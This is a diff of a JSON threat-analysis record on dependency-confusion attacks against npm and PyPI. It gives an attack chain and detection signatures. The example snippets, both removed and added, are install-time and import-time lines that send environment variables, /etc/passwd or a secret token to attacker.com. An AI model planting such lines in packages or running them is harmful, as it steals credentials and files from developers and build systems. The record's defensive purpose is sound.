@@ -1,33 +1,57 @@
 {
   "package_info": {
-    "package_name": "dependency confusion attack packages (multiple, e.g., 'internal-lib', 'company-utils')",
-    "package_manager": "npm (primarily), also PyPI, RubyGems",
-    "package_versions": "latest/highest semver published to public registry",
-    "why_malicious": "These packages are intentionally crafted to exploit the lack of enforced namespacing in public repositories. By registering package names that match internal/private dependencies used by target organizations, attackers can trick build systems into installing malicious code from the public registry instead of the intended internal package, enabling supply chain compromise."
+    "package_name": "dependency confusion (namespace confusion) attack packages",
+    "package_manager": "npm (also PyPI, RubyGems, JCenter, Bintray, Maven Central discussed)",
+    "package_versions": "All versions of attacker-uploaded packages with names matching internal/private dependencies",
+    "why_malicious": "These packages are intentionally published to public repositories with names matching internal/private dependencies used by target organizations. When build systems resolve dependencies, they may inadvertently fetch the attacker's package instead of the intended internal one, enabling arbitrary code execution and supply chain compromise."
   },
   "malicious_snippets": [
     {
       "snippet_id": "snippet_1",
       "execution_context": {
-        "trigger": "install-time (npm install, pip install, gem install)",
-        "file_location": "package.json (npm), setup.py (PyPI), gemspec (RubyGems), or main entrypoint",
+        "trigger": "postinstall",
+        "file_location": "package.json (npm) or setup.py (PyPI)",
         "required_permissions": [
           "network",
           "filesystem",
           "environment_vars"
         ]
       },
-      "code_snippet": "// npm example (in package.json or as a postinstall script)\n\"scripts\": {\n  \"postinstall\": \"curl -X POST -d \\\"$(env)\\\" https://attacker.com/collect\"\n}\n\n// Python example (in setup.py)\nimport os\nimport requests\nos.system('curl -X POST -d \"' + str(os.environ) + '\" https://attacker.com/collect')",
-      "code_language": "javascript, python",
-      "code_behavior": "Exfiltrates environment variables and potentially other sensitive data from the build or CI environment to an attacker-controlled server during package installation.",
+      "code_snippet": "postinstall: 'curl -X POST -d @/etc/passwd https://attacker.com/exfil'",
+      "code_language": "shell",
+      "code_behavior": "During installation, the code reads sensitive files (e.g., /etc/passwd) and exfiltrates their contents via HTTP POST to an attacker-controlled domain.",
       "malice_analysis": {
-        "why_suspicious": "The code executes automatically upon installation, sending environment data to an external server, which is not expected for a legitimate package.",
-        "violated_expectations": "Normal packages do not exfiltrate environment variables or execute network requests during install-time. Legitimate postinstall scripts are rare and should not transmit sensitive data.",
-        "similar_legitimate_use": "Some packages use postinstall scripts for setup or telemetry, but never for exfiltrating secrets.",
+        "why_suspicious": "Postinstall scripts that access sensitive files and send data to external servers are highly suspicious and rarely legitimate.",
+        "violated_expectations": "Normal packages should not execute network exfiltration or access sensitive files during installation.",
+        "similar_legitimate_use": "Some legitimate packages may use postinstall for telemetry or setup, but never for exfiltrating sensitive data.",
         "key_indicators": [
-          "Presence of postinstall or install scripts making network requests",
-          "Access to environment variables or filesystem during install",
-          "Hardcoded external URLs (attacker infrastructure)"
+          "Network requests in postinstall scripts",
+          "Access to sensitive files (e.g., /etc/passwd, environment variables)",
+          "Hardcoded external domains"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "__init__.py (PyPI) or index.js (npm)",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "import os, requests; requests.post('https://attacker.com/exfil', data={'token': os.environ.get('SECRET_TOKEN')})",
+      "code_language": "python",
+      "code_behavior": "At import-time, the code accesses environment variables (e.g., SECRET_TOKEN) and sends their values to a hardcoded domain via HTTPS POST, enabling credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Import-time network exfiltration of environment variables is a clear indicator of malicious intent.",
+        "violated_expectations": "Legitimate packages should not exfiltrate secrets or perform network operations on import.",
+        "similar_legitimate_use": "Rarely, telemetry or error reporting may occur, but not with secrets.",
+        "key_indicators": [
+          "Access to environment variables",
+          "Network requests on import",
+          "Hardcoded exfiltration endpoints"
         ]
       }
     }
@@ -35,46 +59,47 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker identifies internal package names used by target organizations (via log analysis, bug reports, or open source code).",
+      "action": "Attacker identifies internal/private package names used by target organizations.",
       "implemented_by": [],
-      "leads_to": "Preparation for package registration"
+      "leads_to": "Attacker publishes malicious packages with matching names to public repositories."
     },
     {
       "step": 2,
-      "action": "Attacker registers public packages with the same names as internal dependencies, using a higher version number.",
+      "action": "Attacker publishes malicious packages with high version numbers to public repositories (npm, PyPI, etc).",
       "implemented_by": [],
-      "leads_to": "Malicious package is available in public registry"
+      "leads_to": "Build systems resolve dependencies and may fetch the attacker's package instead of the internal one."
     },
     {
       "step": 3,
-      "action": "Target organization's build or CI system resolves dependency to the public (malicious) package due to version precedence or misconfiguration.",
+      "action": "Build systems or developer environments install the malicious package.",
       "implemented_by": [],
-      "leads_to": "Malicious code is installed in target environment"
+      "leads_to": "Malicious code executes (postinstall/import-time)."
     },
     {
       "step": 4,
-      "action": "Malicious code executes at install-time, exfiltrating environment variables and secrets to attacker infrastructure.",
+      "action": "Malicious code executes, exfiltrating sensitive files or environment variables to attacker-controlled domains.",
       "implemented_by": [
-        "snippet_1"
+        "snippet_1",
+        "snippet_2"
       ],
-      "leads_to": "Attacker gains access to sensitive data (e.g., credentials, tokens, internal endpoints)"
+      "leads_to": "Attacker gains access to secrets, credentials, or sensitive data."
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "Install-time scripts making outbound network requests",
-      "Access to environment variables or sensitive files during install",
-      "Unexpected postinstall or install hooks in packages with names matching internal dependencies"
+      "postinstall or import-time scripts making network requests",
+      "access to sensitive files or environment variables during installation or import",
+      "package names matching known internal/private dependencies but published to public repositories"
     ],
     "file_indicators": [
       "package.json with suspicious postinstall scripts",
-      "setup.py or gemspec files containing network exfiltration code",
-      "Presence of install scripts in packages with names matching internal/private dependencies"
+      "setup.py or __init__.py with network exfiltration code",
+      "index.js with HTTP requests to unknown domains"
     ],
     "network_indicators": [
-      "Outbound HTTP/HTTPS requests to unknown or attacker-controlled domains during package installation",
-      "POST requests containing environment variable data"
+      "HTTP/HTTPS requests to attacker-controlled or unknown domains during install/import",
+      "Unusual outbound connections from build or CI/CD environments"
     ],
-    "how_to_detect": "Monitor for install-time scripts in dependencies, especially those matching internal package names. Flag packages that make network requests or access environment variables during installation. Use allow-lists for internal dependencies and block installation of similarly named packages from public registries. Monitor build logs for unexpected install-time network activity."
+    "how_to_detect": "Monitor for packages with names matching internal dependencies appearing in public repositories. Flag postinstall/import-time scripts that access sensitive files or environment variables and make network requests. Alert on outbound connections to unknown domains during build or install processes. Use allow-lists for internal package sources and enforce namespace validation."
   }
 }
